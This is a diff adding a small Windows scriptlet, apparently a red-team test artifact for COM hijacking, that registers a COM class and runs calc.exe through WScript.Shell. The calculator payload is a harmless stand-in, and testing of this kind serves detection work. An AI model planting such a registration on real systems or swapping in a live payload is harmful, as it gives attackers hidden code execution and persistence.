@@ -1,0 +1,17 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+	<registration 
+	    progid="COMHijackTesting" 
+	    remoteable="true" 
+	    version="1.00" 
+	    classid="{00000001-0001-0001-0001-0000DEADBEEF}" >
+	</registration>
+	
+	<script language="JScript">
+		<![CDATA[
+			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+		]]>
+	</script>
+	
+</scriptlet>
